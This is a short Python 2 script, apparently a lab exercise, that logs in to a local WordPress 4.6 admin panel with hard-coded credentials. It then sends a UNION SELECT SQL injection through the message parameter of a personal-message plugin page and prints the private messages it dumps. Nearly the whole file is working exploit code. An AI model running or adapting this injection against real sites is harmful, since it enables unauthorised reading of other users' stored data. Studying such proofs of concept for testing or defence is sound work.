import mechanize
from bs4 import BeautifulSoup
import urllib2

browser = mechanize.Browser()
browser.set_handle_robots(False)

browser.open("http://localhost:8888/WordPress-4.6/wp-admin/")

#printing the title of the page to show my steps
print "\n" + ("# " + browser.title() + "\n")

browser.select_form("loginform")

browser.form['log'] = 'marc98'
browser.form['pwd'] = 'marco'
browser.submit()

#printing the title of the page to show my steps
print "\n" + ("# " + browser.title() + "\n")

#opening a page injecting the malicious sql code with a specific ID to see a specific messagge
response = browser.open("http://localhost:8888/WordPress-4.6/wp-admin/admin.php?page=simple-personal-message-outbox&action=view&message=0%20UNION%20SELECT%20*%20FROM%20wp_spm_message")

page = browser.response().read()

soupParser = BeautifulSoup(page, "lxml")

mydivs = soupParser.findAll("div", {"class": "media-body"})

#printing the message with the id I chose
for div in mydivs:
    print(div)

